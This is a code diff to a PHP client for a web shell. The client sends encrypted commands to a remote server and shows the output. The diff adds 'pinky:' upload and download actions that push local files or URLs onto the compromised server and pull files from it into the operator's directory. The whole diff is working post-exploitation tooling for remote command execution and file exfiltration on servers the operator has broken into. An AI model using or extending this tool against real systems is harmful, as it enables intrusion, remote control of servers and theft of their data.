@@ -93,7 +93,7 @@ if (!$continue) {
     exit(-1);
 }
 echo " [+] Opening the shell... \n";
-sleep(2.5);
+sleep(1);
 print_banner();
 echo "\n";
 echo "Server IP : \e[1m{$ip}\e[0m | Your IP : \e[1m{$client_ip}\e[0m\n";
@@ -108,15 +108,21 @@ do {
         "\r"
     ), '', $line));
     if ($cmd != 'exit' && strlen($cmd) > 0) {
-        $data = array(
-            'c' => encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv),
-            'p' => base64_encode($path)
-        );
+        $data = build_request($cmd, $path, $key, $iv);
+        if(!isset($data['c']) && !isset($data['f'])){
+            continue;
+        }
         $result = send_request($url, $data, $login, $password, $proxy, $cookies);
         if ($result['status'] == 200) {
             $decrypted_content = encrypt_decrypt('decrypt', $result['content'], $key, $iv);
             $response = json_decode($decrypted_content, true);
             $path = base64_decode($response['path']);
+            $files = $response['files'];
+            foreach ($files as $file){
+                $content = $file['content'];
+                $download = base64_to_file($content, getcwd(), basename($file['name']));
+                echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
+            }
             echo base64_decode($response['output']);
         } else {
             echo "\n\tWe received {$result['status']} instead of 200 ¯\_(ツ)_/¯\n\n";
@@ -126,6 +132,59 @@ do {
 /*------------------*/
 /*- Core Functions -*/
 /*------------------*/
+
+function build_request($cmd, $path, $key, $iv)
+{
+    $data     = array(
+        'p' => base64_encode($path)
+    );
+    $position = strpos($cmd, 'pinky:');
+    if ($position === false) {
+        $data['c'] = encrypt_decrypt('encrypt', base64_encode($cmd), $key, $iv);
+    } else {
+        $cmd = str_replace('pinky:','', $cmd);
+        $input = explode(' ', $cmd);
+        $action = $input[0];
+        array_shift($input);
+        if ($action == 'upload') {
+            $data['f']      = array(); // files
+            $data['f']['u'] = array(); // urls
+            $data['f']['b'] = array(); // binaries
+            foreach ($input as $entry) {
+                if (filter_var($entry, FILTER_VALIDATE_URL)) {
+                    $parsed = parse_url($entry);
+                    $name = base64_encode(basename($parsed['path']));
+                    $url = base64_encode($entry);
+                    $array = array(
+                            'n'=> encrypt_decrypt('encrypt', $name, $key, $iv),
+                            'p'=> encrypt_decrypt('encrypt', $url, $key, $iv)
+                    );
+                    array_push($data['f']['u'], $array);
+                } else {
+                    $file = file_to_base64($entry);
+                    if (!is_null($file)) {
+                        $name = base64_encode(basename(realpath($entry)));
+                        $array = array(
+                            'n'=> encrypt_decrypt('encrypt', $name, $key, $iv),
+                            'p'=> encrypt_decrypt('encrypt', $file, $key, $iv)
+                        );
+                        array_push($data['f']['b'], $array);
+                    } else {
+                        echo " [!] ERROR: {$entry} doesn't exists or isn't readable.\n";
+                    }
+                }
+            }
+        } elseif ($action == 'download'){
+            $data['f'] = array();
+            $data['f']['d'] = array(); // files to download
+            foreach ($input as $entry) {
+                $name = base64_encode($entry);
+                array_push($data['f']['d'], encrypt_decrypt('encrypt', $name, $key, $iv));
+            }
+        }
+    }
+    return $data;
+}
 
 function send_request($url, $data, $login, $password, $proxy = array(), $cookies = null)
 {
@@ -181,6 +240,7 @@ function send_request($url, $data, $login, $password, $proxy = array(), $cookies
 
     $info = curl_getinfo($ch);
     curl_close($ch);
+
     return array(
         'status' => $info['http_code'],
         'content' => $result
@@ -220,6 +280,26 @@ function is_json_valid($config)
     }
 
     return true;
+}
+
+function file_to_base64($file)
+{
+    if(file_exists($file) && is_readable($file)){
+        return base64_encode(file_get_contents($file));
+    }
+    return null;
+}
+
+function base64_to_file($base64_string, $path, $output_file)
+{
+    if(!is_writable($path)){
+        return null;
+    }
+    $complete_path = $path . '/'. $output_file;
+    $handle = fopen($complete_path, "wb");
+    fwrite($handle, base64_decode($base64_string));
+    fclose($handle);
+    return $output_file;
 }
 
 function print_banner()
@@ -630,7 +710,7 @@ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'               `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 $$$$$$$$$$$$$$$$$$$$$$$$$$$$'                   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 $$$'`$$$$$$$$$$$$$'`$$$$$$!                       !$$$$$$'`$$$$$$$$$$$$$'`$$$
 $$$$  $$$$$$$$$$$  $$$$$$$                         $$$$$$$  $$$$$$$$$$$  $$$$
-$$$$. `$' \' \$`  $$$$$$$!                         !$$$$$$$  '$/ `/ `$' .$$$$
+$$$$. `$' \' \$`  $$$$$$$!                          !$$$$$$$  '$/ `/ `$' .$$$$
 $$$$$. !\  i  i .$$$$$$$$                           $$$$$$$$. i  i  /! .$$$$$
 $$$$$$   `--`--.$$$$$$$$$                           $$$$$$$$$.--'--'   $$$$$$
 $$$$$\$L        `$$$$$^^$$                           $$^^$$$$$'        J$$$$$$
